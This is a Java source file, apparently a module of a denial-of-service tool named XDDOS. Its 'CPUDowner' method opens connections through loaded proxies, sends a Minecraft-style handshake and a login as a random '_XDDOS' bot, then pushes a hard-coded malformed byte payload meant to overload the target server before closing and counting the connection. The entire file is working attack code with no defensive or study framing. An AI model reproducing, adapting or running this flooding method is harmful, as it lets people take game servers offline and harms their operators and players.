package XD.XDDOS.methods.impl;

import java.io.IOException;
import java.security.SecureRandom;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.packet.LoginRequest;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class CPUDowner
implements IMethod{

    final int a = Integer.parseInt(System.getProperty("len", "25555"));
    private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();


  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest((new SecureRandom()).nextInt(9999999) + "_XDDOS")).getWrappedPacket()));
      bbbb.write(3);
      bbbb.write(1);
      bbbb.write(0);
      bbbb.write(-69);
      bbbb.write(1);
      bbbb.write(0);
      bbbb.write(0);
      bbbb.write(-73);
      bbbb.write(3);
      bbbb.write(3);
      bbbb.write(-53);
      bbbb.write(-126);
      bbbb.write(-82);
      bbbb.write(83);
      bbbb.write(21);
      bbbb.write(-10);
      bbbb.write(121);
      bbbb.write(2);
      bbbb.write(-62);
      bbbb.write(11);
      bbbb.write(-31);
      bbbb.write(-62);
      bbbb.write(106);
      bbbb.write(-8);
      bbbb.write(117);
      bbbb.write(-23);
      bbbb.write(50);
      bbbb.write(35);
      bbbb.write(60);
      bbbb.write(57);
      bbbb.write(3);
      bbbb.write(63);
      bbbb.write(-92);
      bbbb.write(-57);
      bbbb.write(-75);
      bbbb.write(-120);
      bbbb.write(80);
      bbbb.write(31);
      bbbb.write(46);
      bbbb.write(101);
      bbbb.write(33);
      bbbb.write(0);
      bbbb.write(0);
      bbbb.write(72);
      bbbb.write(0);
      bbbb.write(47);
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}


